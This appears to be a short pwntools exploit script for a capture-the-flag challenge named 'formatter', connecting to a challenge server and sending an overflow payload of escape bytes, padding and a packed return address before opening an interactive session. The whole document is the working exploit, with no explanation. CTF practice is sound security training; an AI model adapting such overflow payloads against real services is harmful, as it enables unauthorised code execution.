from pwn import *

r=remote("formatter.challs.olicyber.it", 20006)
r.sendline(b'\\b'*12+b'a'*32+p64(0x401255))
r.interactive()
